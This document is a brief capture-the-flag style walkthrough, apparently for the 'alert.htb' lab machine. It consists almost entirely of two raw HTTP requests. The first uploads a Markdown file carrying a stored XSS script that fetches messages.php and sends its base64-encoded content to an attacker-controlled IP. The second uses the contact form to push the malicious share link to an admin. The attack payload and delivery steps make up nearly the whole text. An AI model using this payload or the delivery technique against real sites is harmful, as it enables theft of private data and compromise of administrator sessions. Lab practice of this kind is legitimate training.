
Upload a MarkDown file with JavaScript embedded (XSS):

POST /visualizer.php HTTP/1.1
Host: alert.htb
Content-Length: 542
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://alert.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEnBs8udtB1yPBAGn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://alert.htb/index.php?page=alert
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryEnBs8udtB1yPBAGn
Content-Disposition: form-data; name="file"; filename="ex3.md"
Content-Type: text/markdown

Hahaha
<script>
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "http://alert.htb/messages.php",false ); // false for synchronous request
xmlHttp.send( );
var xmlHttp2 = new XMLHttpRequest();
xmlHttp2.open( "GET", "http://10.10.14.6:8000?suction="+btoa(xmlHttp.responseText),true ); // false for synchronous request
xmlHttp2.send( );
</script>

------WebKitFormBoundaryEnBs8udtB1yPBAGn--



Now you can forward it to the admin hoping they will click on the link

POST /contact.php HTTP/1.1
Host: alert.htb
Content-Length: 97
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://alert.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://alert.htb/index.php?page=contact
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

email=ddd%40ddd.com&message=http://alert.htb/visualizer.php?link_share=68104ed741eed8.10388805.md
